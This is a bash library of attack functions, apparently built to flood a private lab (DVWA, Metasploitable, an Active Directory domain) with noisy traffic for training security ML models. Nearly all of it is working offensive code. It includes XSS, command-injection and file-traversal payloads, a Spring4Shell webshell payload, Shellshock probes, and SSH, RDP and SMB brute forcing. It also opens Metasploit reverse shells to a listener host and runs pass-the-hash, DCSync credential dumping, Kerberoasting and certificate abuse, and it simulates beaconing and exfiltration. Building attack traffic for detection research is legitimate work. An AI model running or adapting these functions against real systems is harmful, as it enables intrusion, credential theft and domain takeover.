#!/bin/bash
###############################################################################
# NOISE ATTACKS - Maximum Volume Attack Functions
# Part of the Maximum Noise 48h Campaign
#
# These functions are designed to generate HIGH-SIGNAL network traffic
# for ML training data. NO stealth, NO evasion - pure noise.
###############################################################################

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../configs/targets.conf" 2>/dev/null || true

# Default targets
DVWA_IP="${DVWA_IP:-10.10.40.10}"
METASPLOIT_IP="${METASPLOIT_IP:-10.10.40.20}"
WINDOWS_IP="${WINDOWS_IP:-10.10.40.21}"
AD_DC_IP="${AD_DC_IP:-10.10.30.40}"
AD_WS_IP="${AD_WS_IP:-10.10.30.41}"
AD_DOMAIN="${AD_DOMAIN:-lab.local}"
TARGET_SUBNET="${TARGET_SUBNET:-10.10.40.0/24}"

WORDLISTS="/home/butcher/soc-ml/attacks/wordlists"
RESULTS="/home/butcher/soc-ml/attacks/results"

mkdir -p "$RESULTS"

#=============================================================================
# SCANNING - Maximum Volume
#=============================================================================

masscan_full() {
    local target="${1:-$TARGET_SUBNET}"
    echo "[NOISE] Masscan full port scan: $target"
    masscan -p1-65535 "$target" --rate=10000 --wait=2 -oL "$RESULTS/masscan_$(date +%s).txt"
}

nmap_allports() {
    local target="${1:-$TARGET_SUBNET}"
    echo "[NOISE] Nmap all ports aggressive: $target"
    nmap -p- -T5 -sV -sC --open "$target" -oN "$RESULTS/nmap_allports_$(date +%s).txt"
}

nmap_all_scripts() {
    local target="${1:-$DVWA_IP}"
    echo "[NOISE] Nmap all scripts: $target"
    nmap -sV --script=vuln,exploit,auth,default "$target" -oN "$RESULTS/nmap_scripts_$(date +%s).txt"
}

#=============================================================================
# WEB ATTACKS - Maximum Payloads
#=============================================================================

sqlmap_maximum() {
    local target="${1:-http://$DVWA_IP/vulnerabilities/sqli/?id=1&Submit=Submit}"
    local cookie="${2:-security=low; PHPSESSID=test}"
    echo "[NOISE] SQLMap maximum: $target"
    sqlmap -u "$target" \
        --cookie="$cookie" \
        --level=5 \
        --risk=3 \
        --batch \
        --forms \
        --crawl=3 \
        --threads=10 \
        --time-sec=2 \
        --technique=BEUSTQ \
        --tamper=space2comment,between,randomcase \
        -o "$RESULTS/sqlmap_$(date +%s).txt" 2>&1 || true
}

nuclei_full_scan() {
    local target="${1:-http://$DVWA_IP}"
    echo "[NOISE] Nuclei full scan: $target"
    nuclei -u "$target" \
        -severity critical,high,medium,low \
        -c 50 \
        -o "$RESULTS/nuclei_full_$(date +%s).txt" 2>&1 || true
}

nuclei_cve_scan() {
    local target="${1:-http://$DVWA_IP}"
    echo "[NOISE] Nuclei CVE scan: $target"
    nuclei -u "$target" \
        -t cves/ \
        -c 50 \
        -o "$RESULTS/nuclei_cves_$(date +%s).txt" 2>&1 || true
}

xss_polyglot() {
    local target="${1:-$DVWA_IP}"
    echo "[NOISE] XSS polyglot payloads: $target"

    # Polyglot payloads that work across contexts
    PAYLOADS=(
        "jaVasCript:/*-/*\`/*\\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
        "'\"-->]]>*/</script></style></title></textarea><img src=x onerror=alert()>"
        "<svg/onload=alert()>"
        "<img src=x onerror=alert(1)>"
        "<body onload=alert(1)>"
        "javascript:alert(1)"
        "\"><script>alert(1)</script>"
        "'-alert(1)-'"
        "<ScRiPt>alert(1)</ScRiPt>"
        "<IMG SRC=javascript:alert('XSS')>"
    )

    for payload in "${PAYLOADS[@]}"; do
        encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
        curl -s "http://$target/vulnerabilities/xss_r/?name=$encoded" \
            -H "Cookie: security=low; PHPSESSID=test" > /dev/null 2>&1
        curl -s "http://$target/vulnerabilities/xss_s/" \
            -d "txtName=$payload&mtxMessage=test&btnSign=Sign+Guestbook" \
            -H "Cookie: security=low; PHPSESSID=test" > /dev/null 2>&1
    done
}

cmdi_all_os() {
    local target="${1:-$DVWA_IP}"
    echo "[NOISE] Command injection all variants: $target"

    PAYLOADS=(
        "; id"
        "| id"
        "|| id"
        "& id"
        "&& id"
        "\`id\`"
        "\$(id)"
        "; cat /etc/passwd"
        "| cat /etc/passwd"
        "; whoami"
        "& whoami"
        "; uname -a"
        "| uname -a"
        "; ls -la"
        "| ls -la /"
        # Windows variants
        "& dir"
        "| dir"
        "& type C:\\Windows\\System32\\drivers\\etc\\hosts"
        "| net user"
        "& ipconfig"
    )

    for payload in "${PAYLOADS[@]}"; do
        encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('127.0.0.1$payload'))")
        curl -s "http://$target/vulnerabilities/exec/" \
            -d "ip=$encoded&Submit=Submit" \
            -H "Cookie: security=low; PHPSESSID=test" > /dev/null 2>&1
    done
}

lfi_deep_traversal() {
    local target="${1:-$DVWA_IP}"
    echo "[NOISE] LFI deep traversal: $target"

    # Generate deep traversal paths
    FILES=(
        "/etc/passwd"
        "/etc/shadow"
        "/etc/hosts"
        "/proc/self/environ"
        "/var/log/apache2/access.log"
        "/var/log/apache2/error.log"
        "C:\\Windows\\System32\\drivers\\etc\\hosts"
        "C:\\Windows\\win.ini"
    )

    TRAVERSALS=(
        "../"
        "....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//"
        "..%2f"
        "%2e%2e%2f"
        "..%252f"
        "....%2f%2f"
        "%c0%ae%c0%ae/"
        "..%00/"
        "../"
    )

    for file in "${FILES[@]}"; do
        for trav in "${TRAVERSALS[@]}"; do
            # Build path with many traversals
            path="${trav}${trav}${trav}${trav}${trav}${trav}${trav}${trav}${trav}${trav}${file}"
            curl -s "http://$target/vulnerabilities/fi/?page=$path" \
                -H "Cookie: security=low; PHPSESSID=test" > /dev/null 2>&1

            # With null byte
            curl -s "http://$target/vulnerabilities/fi/?page=$path%00" \
                -H "Cookie: security=low; PHPSESSID=test" > /dev/null 2>&1
        done
    done
}

dirb_huge_wordlist() {
    local target="${1:-http://$DVWA_IP}"
    echo "[NOISE] Dirb huge wordlist: $target"

    # Use multiple wordlists
    dirb "$target" /usr/share/wordlists/dirb/big.txt -o "$RESULTS/dirb_big_$(date +%s).txt" 2>&1 || true

    if [[ -f /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt ]]; then
        gobuster dir -u "$target" \
            -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
            -t 50 \
            -o "$RESULTS/gobuster_$(date +%s).txt" 2>&1 || true
    fi
}

spring4shell_probe() {
    local target="${1:-$WINDOWS_IP}"
    echo "[NOISE] Spring4Shell CVE-2022-22965 probe: $target"

    # Spring4Shell payload attempts
    ENDPOINTS=("/" "/login" "/admin" "/api" "/actuator")

    for endpoint in "${ENDPOINTS[@]}"; do
        curl -s "http://$target:8080$endpoint" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp" \
            > /dev/null 2>&1
    done
}

shellshock_probe() {
    local target="${1:-$DVWA_IP}"
    echo "[NOISE] Shellshock CVE-2014-6271 probe: $target"

    PAYLOAD="() { :;}; /bin/bash -c 'id'"

    # Try common CGI paths
    CGI_PATHS=("/cgi-bin/test.cgi" "/cgi-bin/status" "/cgi-bin/test-cgi" "/cgi-bin/printenv")

    for path in "${CGI_PATHS[@]}"; do
        curl -s "http://$target$path" \
            -H "User-Agent: $PAYLOAD" \
            -H "Cookie: $PAYLOAD" \
            -H "Referer: $PAYLOAD" \
            > /dev/null 2>&1
    done
}

#=============================================================================
# BRUTE FORCE - Maximum Threads
#=============================================================================

hydra_ssh_maximum() {
    local target="${1:-$METASPLOIT_IP}"
    local userlist="${2:-$WORDLISTS/users_short.txt}"
    local passlist="${3:-$WORDLISTS/passwords_10k.txt}"
    echo "[NOISE] Hydra SSH maximum threads: $target"

    # Use rockyou if available
    [[ -f "$WORDLISTS/rockyou.txt" ]] && passlist="$WORDLISTS/rockyou.txt"

    hydra -L "$userlist" -P "$passlist" -t 64 -f -V "$target" ssh 2>&1 || true
}

hydra_ftp_maximum() {
    local target="${1:-$METASPLOIT_IP}"
    echo "[NOISE] Hydra FTP maximum threads: $target"
    hydra -L "$WORDLISTS/users_short.txt" -P "$WORDLISTS/passwords_10k.txt" \
        -t 64 -f -V "$target" ftp 2>&1 || true
}

hydra_telnet_maximum() {
    local target="${1:-$METASPLOIT_IP}"
    echo "[NOISE] Hydra Telnet maximum threads: $target"
    hydra -L "$WORDLISTS/users_short.txt" -P "$WORDLISTS/passwords_10k.txt" \
        -t 64 -f -V "$target" telnet 2>&1 || true
}

hydra_mysql_maximum() {
    local target="${1:-$METASPLOIT_IP}"
    echo "[NOISE] Hydra MySQL maximum threads: $target"
    hydra -L "$WORDLISTS/users_short.txt" -P "$WORDLISTS/passwords_10k.txt" \
        -t 64 -f -V "$target" mysql 2>&1 || true
}

hydra_rdp_maximum() {
    local target="${1:-$WINDOWS_IP}"
    echo "[NOISE] Hydra RDP maximum threads: $target"
    hydra -L "$WORDLISTS/users_short.txt" -P "$WORDLISTS/passwords_10k.txt" \
        -t 16 -f -V "$target" rdp 2>&1 || true
}

medusa_parallel_brute() {
    local target="${1:-$METASPLOIT_IP}"
    echo "[NOISE] Medusa parallel brute: $target"
    medusa -h "$target" -U "$WORDLISTS/users_short.txt" -P "$WORDLISTS/passwords_10k.txt" \
        -M ssh -t 64 -f 2>&1 || true
}

cme_smb_brute() {
    local target="${1:-$WINDOWS_IP}"
    echo "[NOISE] CrackMapExec SMB brute: $target"
    crackmapexec smb "$target" -u "$WORDLISTS/users_short.txt" \
        -p "$WORDLISTS/passwords_10k.txt" --continue-on-success 2>&1 || true
}

patator_http_brute() {
    local target="${1:-$DVWA_IP}"
    echo "[NOISE] Patator HTTP brute: $target"
    patator http_fuzz url="http://$target/login" method=POST \
        body="username=FILE0&password=FILE1" \
        0="$WORDLISTS/users_short.txt" 1="$WORDLISTS/passwords_10k.txt" \
        -x ignore:fgrep='Invalid' \
        -t 50 2>&1 || true
}

#=============================================================================
# METASPLOIT - Reverse Shells
#=============================================================================

msf_reverse_shells() {
    local target="${1:-$METASPLOIT_IP}"
    local lhost="10.10.20.20"
    local lport="4444"
    echo "[NOISE] Metasploit reverse shell attempts: $target"

    # Create resource file
    cat > /tmp/msf_shells.rc << EOF
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS $target
set PAYLOAD cmd/unix/interact
exploit -j

use exploit/multi/misc/java_rmi_server
set RHOSTS $target
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST $lhost
set LPORT $lport
exploit -j

use exploit/linux/misc/distccd_exec
set RHOSTS $target
set PAYLOAD cmd/unix/reverse
set LHOST $lhost
set LPORT 4445
exploit -j

use exploit/multi/http/tomcat_mgr_upload
set RHOSTS $target
set RPORT 8180
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST $lhost
set LPORT 4446
set HttpUsername tomcat
set HttpPassword tomcat
exploit -j

exit -y
EOF

    msfconsole -q -r /tmp/msf_shells.rc 2>&1 || true
    rm /tmp/msf_shells.rc
}

msf_meterpreter_sessions() {
    local target="${1:-$METASPLOIT_IP}"
    echo "[NOISE] Metasploit Meterpreter attempts: $target"

    # Focus on Meterpreter payloads
    cat > /tmp/msf_meter.rc << EOF
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS $target
run

use auxiliary/scanner/ssh/ssh_login
set RHOSTS $target
set USERNAME msfadmin
set PASSWORD msfadmin
run

use auxiliary/scanner/postgres/postgres_login
set RHOSTS $target
run

exit -y
EOF

    msfconsole -q -r /tmp/msf_meter.rc 2>&1 || true
    rm /tmp/msf_meter.rc
}

#=============================================================================
# C2 FRAMEWORKS
#=============================================================================

sliver_http_beacon() {
    local target="${1:-$DVWA_IP}"
    echo "[NOISE] Sliver HTTP C2 beacon simulation: $target"

    # Simulate Sliver-like beacon traffic
    for i in {1..100}; do
        # Beacon check-in
        curl -s "http://$target/api/v1/session" \
            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
            -H "X-Request-ID: $(openssl rand -hex 16)" \
            -d "$(openssl rand -base64 256)" \
            > /dev/null 2>&1

        # Task polling
        curl -s "http://$target/api/v1/tasks" \
            -H "Authorization: Bearer $(openssl rand -hex 32)" \
            > /dev/null 2>&1

        sleep 1
    done
}

beacon_rapid_1s() {
    local target="${1:-$DVWA_IP}"
    echo "[NOISE] Rapid beacon (1s interval): $target"

    for i in {1..300}; do
        curl -s "http://$target/" \
            -H "X-Beacon-ID: $(hostname)-$$" \
            -H "X-Timestamp: $(date +%s)" \
            > /dev/null 2>&1
        sleep 1
    done
}

dnscat2_tunnel() {
    local target="${1:-$AD_DC_IP}"
    echo "[NOISE] Simulating dnscat2-like DNS tunnel traffic"

    # Generate DNS queries that mimic dnscat2 patterns
    for i in {1..200}; do
        # Random subdomain encoding (mimics dnscat2)
        subdomain=$(openssl rand -hex 16)
        dig @"$target" "$subdomain.tunnel.local" TXT +short > /dev/null 2>&1
        dig @"$target" "$subdomain.c2.local" A +short > /dev/null 2>&1
        sleep 0.5
    done
}

iodine_dns_tunnel() {
    local target="${1:-$AD_DC_IP}"
    echo "[NOISE] Simulating iodine-like DNS tunnel traffic"

    # Iodine uses specific encoding patterns
    for i in {1..200}; do
        subdomain=$(openssl rand -base32 32 | tr -d '=' | tr '[:upper:]' '[:lower:]')
        dig @"$target" "$subdomain.t.local" NULL +short > /dev/null 2>&1
        sleep 0.5
    done
}

ptunnel_icmp() {
    local target="${1:-$DVWA_IP}"
    echo "[NOISE] ICMP tunnel simulation: $target"

    # Generate ICMP traffic with data payloads
    for i in {1..100}; do
        # Large ICMP packets with data
        ping -c 1 -s 1400 -p "$(openssl rand -hex 700)" "$target" > /dev/null 2>&1
        sleep 0.5
    done
}

#=============================================================================
# EXFILTRATION
#=============================================================================

exfil_large_http() {
    local target="${1:-$DVWA_IP}"
    echo "[NOISE] Large HTTP exfiltration: $target"

    # Generate 10MB of random data and POST it
    dd if=/dev/urandom bs=1M count=10 2>/dev/null | base64 | \
        curl -s -X POST "http://$target/upload" \
            -H "Content-Type: application/octet-stream" \
            --data-binary @- > /dev/null 2>&1
}

exfil_large_dns() {
    local target="${1:-$AD_DC_IP}"
    echo "[NOISE] High-volume DNS exfiltration: $target"

    # Exfiltrate data via DNS TXT queries
    for i in {1..500}; do
        data=$(openssl rand -hex 30)
        dig @"$target" "$data.exfil.local" TXT +short > /dev/null 2>&1
    done
}

exfil_encoded_chunks() {
    local target="${1:-$DVWA_IP}"
    echo "[NOISE] Encoded chunk exfiltration: $target"

    # Base64 encoded chunks via GET parameters
    for i in {1..100}; do
        chunk=$(openssl rand -base64 100 | tr -d '\n')
        curl -s "http://$target/?data=$chunk&chunk=$i" > /dev/null 2>&1
    done
}

#=============================================================================
# IMPACKET SUITE
#=============================================================================

impacket_psexec() {
    local target="${1:-$WINDOWS_IP}"
    local user="${2:-administrator}"
    local pass="${3:-password}"
    echo "[NOISE] Impacket psexec: $target"
    impacket-psexec "$user:$pass@$target" "whoami" 2>&1 || true
}

impacket_wmiexec() {
    local target="${1:-$WINDOWS_IP}"
    local user="${2:-administrator}"
    local pass="${3:-password}"
    echo "[NOISE] Impacket wmiexec: $target"
    impacket-wmiexec "$user:$pass@$target" "whoami" 2>&1 || true
}

impacket_smbexec() {
    local target="${1:-$WINDOWS_IP}"
    local user="${2:-administrator}"
    local pass="${3:-password}"
    echo "[NOISE] Impacket smbexec: $target"
    impacket-smbexec "$user:$pass@$target" "whoami" 2>&1 || true
}

impacket_atexec() {
    local target="${1:-$WINDOWS_IP}"
    local user="${2:-administrator}"
    local pass="${3:-password}"
    echo "[NOISE] Impacket atexec: $target"
    impacket-atexec "$user:$pass@$target" "whoami" 2>&1 || true
}

impacket_pth_all() {
    local target="${1:-$WINDOWS_IP}"
    local user="${2:-administrator}"
    local hash="${3:-aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0}"
    echo "[NOISE] Impacket pass-the-hash all methods: $target"

    impacket-psexec -hashes "$hash" "$user@$target" "whoami" 2>&1 || true
    impacket-wmiexec -hashes "$hash" "$user@$target" "whoami" 2>&1 || true
    impacket-smbexec -hashes "$hash" "$user@$target" "whoami" 2>&1 || true
}

impacket_secretsdump() {
    local target="${1:-$AD_DC_IP}"
    local user="${2:-administrator}"
    local pass="${3:-password}"
    local domain="${4:-$AD_DOMAIN}"
    echo "[NOISE] Impacket secretsdump DCSync: $target"
    impacket-secretsdump "$domain/$user:$pass@$target" 2>&1 || true
}

#=============================================================================
# RESPONDER / NETWORK
#=============================================================================

responder_analyze() {
    local interface="${1:-eth0}"
    echo "[NOISE] Responder analyze mode (10 seconds)"
    timeout 10 responder -I "$interface" -A 2>&1 || true
}

snmp_walk_full_mib() {
    local target="${1:-10.10.40.43}"
    local community="${2:-public}"
    echo "[NOISE] SNMP walk full MIB: $target"
    snmpwalk -v2c -c "$community" "$target" . 2>&1 | head -1000 || true
}

dns_axfr_all_targets() {
    echo "[NOISE] DNS zone transfer attempts all targets"
    for target in "$AD_DC_IP" "10.10.40.20" "10.10.40.21"; do
        dig @"$target" axfr local 2>&1 || true
        dig @"$target" axfr lab.local 2>&1 || true
    done
}

#=============================================================================
# ACTIVE DIRECTORY
#=============================================================================

kerbrute_userenum() {
    local target="${1:-$AD_DC_IP}"
    local domain="${2:-$AD_DOMAIN}"
    echo "[NOISE] Kerbrute user enumeration: $target"

    if command -v kerbrute &> /dev/null; then
        kerbrute userenum -d "$domain" --dc "$target" \
            /usr/share/seclists/Usernames/top-usernames-shortlist.txt 2>&1 || true
    else
        echo "Kerbrute not installed"
    fi
}

kerbrute_passwordspray() {
    local target="${1:-$AD_DC_IP}"
    local domain="${2:-$AD_DOMAIN}"
    echo "[NOISE] Kerbrute password spray: $target"

    if command -v kerbrute &> /dev/null; then
        kerbrute passwordspray -d "$domain" --dc "$target" \
            /usr/share/seclists/Usernames/top-usernames-shortlist.txt "Password123!" 2>&1 || true
    else
        echo "Kerbrute not installed"
    fi
}

bloodhound_all_methods() {
    local target="${1:-$AD_DC_IP}"
    local domain="${2:-$AD_DOMAIN}"
    local user="${3:-administrator}"
    local pass="${4:-password}"
    echo "[NOISE] BloodHound all collection methods: $target"

    # Using bloodhound-python
    bloodhound-python -d "$domain" -u "$user" -p "$pass" \
        -ns "$target" -c All --zip 2>&1 || true
}

rubeus_kerberoast() {
    echo "[NOISE] Rubeus Kerberoast simulation"
    # Rubeus requires Windows - simulate the traffic pattern
    # This generates the same Kerberos TGS-REQ traffic

    local target="${1:-$AD_DC_IP}"
    local domain="${2:-$AD_DOMAIN}"

    # Use Impacket's GetUserSPNs instead
    impacket-GetUserSPNs "$domain/administrator:password" -dc-ip "$target" \
        -request 2>&1 || true
}

rubeus_asreproast() {
    echo "[NOISE] Rubeus AS-REP roast simulation"
    local target="${1:-$AD_DC_IP}"
    local domain="${2:-$AD_DOMAIN}"

    # Use Impacket's GetNPUsers
    impacket-GetNPUsers "$domain/" -dc-ip "$target" \
        -usersfile /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
        -format hashcat 2>&1 || true
}

cme_password_spray() {
    local target="${1:-$AD_DC_IP}"
    local domain="${2:-$AD_DOMAIN}"
    echo "[NOISE] CrackMapExec password spray: $target"

    crackmapexec smb "$target" -d "$domain" \
        -u /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
        -p "Password123!" --continue-on-success 2>&1 || true
}

cme_pass_the_hash() {
    local target="${1:-$AD_DC_IP}"
    local domain="${2:-$AD_DOMAIN}"
    local user="${3:-administrator}"
    local hash="${4:-aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0}"
    echo "[NOISE] CrackMapExec pass-the-hash: $target"

    crackmapexec smb "$target" -d "$domain" -u "$user" -H "$hash" 2>&1 || true
}

#=============================================================================
# NEW TOOLS - Certipy, ffuf, feroxbuster, dalfox, commix, coercer
#=============================================================================

certipy_find() {
    local target="${1:-$AD_DC_IP}"
    local domain="${2:-$AD_DOMAIN}"
    local user="${3:-administrator}"
    local pass="${4:-password}"
    echo "[NOISE] Certipy AD CS enumeration: $target"
    certipy-ad find -u "$user@$domain" -p "$pass" -dc-ip "$target" \
        -vulnerable -stdout 2>&1 || true
}

certipy_esc1() {
    local target="${1:-$AD_DC_IP}"
    local domain="${2:-$AD_DOMAIN}"
    local user="${3:-administrator}"
    local pass="${4:-password}"
    echo "[NOISE] Certipy ESC1 attack attempt: $target"
    # Request certificate with SAN
    certipy-ad req -u "$user@$domain" -p "$pass" -dc-ip "$target" \
        -ca "lab-DC01-CA" -template "User" -upn "administrator@$domain" 2>&1 || true
}

certipy_shadow() {
    local target="${1:-$AD_DC_IP}"
    local domain="${2:-$AD_DOMAIN}"
    local user="${3:-administrator}"
    local pass="${4:-password}"
    echo "[NOISE] Certipy shadow credentials: $target"
    certipy-ad shadow auto -u "$user@$domain" -p "$pass" -dc-ip "$target" \
        -account "DC01$" 2>&1 || true
}

ffuf_vhost() {
    local target="${1:-$DVWA_IP}"
    echo "[NOISE] ffuf virtual host fuzzing: $target"
    ffuf -u "http://$target/" -H "Host: FUZZ.$target" \
        -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
        -mc 200,301,302,403 -t 50 -o "$RESULTS/ffuf_vhost_$(date +%s).json" 2>&1 || true
}

ffuf_dirs() {
    local target="${1:-http://$DVWA_IP}"
    echo "[NOISE] ffuf directory fuzzing: $target"
    ffuf -u "$target/FUZZ" \
        -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
        -mc 200,301,302,403 -t 100 -o "$RESULTS/ffuf_dirs_$(date +%s).json" 2>&1 || true
}

ffuf_params() {
    local target="${1:-http://$DVWA_IP/vulnerabilities/sqli/}"
    echo "[NOISE] ffuf parameter fuzzing: $target"
    ffuf -u "$target?FUZZ=test" \
        -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
        -mc 200 -t 50 -o "$RESULTS/ffuf_params_$(date +%s).json" 2>&1 || true
}

feroxbuster_recursive() {
    local target="${1:-http://$DVWA_IP}"
    echo "[NOISE] feroxbuster recursive scan: $target"
    feroxbuster -u "$target" \
        -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
        --depth 4 --threads 100 --no-state \
        -o "$RESULTS/ferox_$(date +%s).txt" 2>&1 || true
}

dalfox_scan() {
    local target="${1:-http://$DVWA_IP/vulnerabilities/xss_r/?name=test}"
    echo "[NOISE] dalfox XSS scan: $target"
    dalfox url "$target" \
        --cookie "security=low; PHPSESSID=test" \
        --silence --no-color \
        -o "$RESULTS/dalfox_$(date +%s).txt" 2>&1 || true
}

dalfox_pipe() {
    local target="${1:-$DVWA_IP}"
    echo "[NOISE] dalfox piped XSS scan: $target"
    # Scan multiple endpoints
    echo "http://$target/vulnerabilities/xss_r/?name=test
http://$target/vulnerabilities/xss_s/?txtName=test
http://$target/vulnerabilities/sqli/?id=1" | \
    dalfox pipe --cookie "security=low; PHPSESSID=test" \
        --silence --no-color 2>&1 || true
}

commix_scan() {
    local target="${1:-http://$DVWA_IP/vulnerabilities/exec/}"
    echo "[NOISE] commix command injection scan: $target"
    commix -u "$target" \
        --data="ip=127.0.0.1&Submit=Submit" \
        --cookie="security=low; PHPSESSID=test" \
        --batch --all \
        --output-dir="$RESULTS" 2>&1 || true
}

coercer_scan() {
    local target="${1:-$AD_DC_IP}"
    local user="${2:-administrator}"
    local pass="${3:-password}"
    local domain="${4:-$AD_DOMAIN}"
    echo "[NOISE] Coercer authentication coercion scan: $target"
    coercer scan -u "$user" -p "$pass" -d "$domain" -t "$target" \
        --listener 10.10.20.20 2>&1 || true
}

coercer_coerce() {
    local target="${1:-$AD_DC_IP}"
    local listener="${2:-10.10.20.20}"
    local user="${3:-administrator}"
    local pass="${4:-password}"
    local domain="${5:-$AD_DOMAIN}"
    echo "[NOISE] Coercer authentication coercion: $target -> $listener"
    coercer coerce -u "$user" -p "$pass" -d "$domain" -t "$target" \
        --listener "$listener" --all-methods 2>&1 || true
}

httpx_probe() {
    local target="${1:-$TARGET_SUBNET}"
    echo "[NOISE] httpx HTTP probing: $target"
    echo "$target" | httpx -silent -ports 80,443,8080,8443,3000,8000,8888 \
        -title -status-code -tech-detect -follow-redirects \
        -o "$RESULTS/httpx_$(date +%s).txt" 2>&1 || true
}

httpx_targets() {
    echo "[NOISE] httpx all targets probe"
    echo "10.10.40.10
10.10.40.20
10.10.40.21
10.10.40.30
10.10.40.31
10.10.40.32" | httpx -silent -ports 80,443,8080,8443,3000,8000,8180,8020 \
        -title -status-code -tech-detect -follow-redirects \
        -o "$RESULTS/httpx_targets_$(date +%s).txt" 2>&1 || true
}

ldapdomaindump_full() {
    local target="${1:-$AD_DC_IP}"
    local user="${2:-administrator}"
    local pass="${3:-password}"
    local domain="${4:-$AD_DOMAIN}"
    echo "[NOISE] ldapdomaindump full enumeration: $target"
    ldapdomaindump -u "$domain\\$user" -p "$pass" ldap://"$target" \
        -o "$RESULTS/ldapdump_$(date +%s)" 2>&1 || true
}

#=============================================================================
# MAIN - Allow direct invocation
#=============================================================================

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    if [[ $# -lt 1 ]]; then
        echo "Usage: $0 <function_name> [args...]"
        echo "Available functions:"
        grep "^[a-z_]*() {" "$0" | sed 's/() {//'
        exit 1
    fi

    func="$1"
    shift
    "$func" "$@"
fi
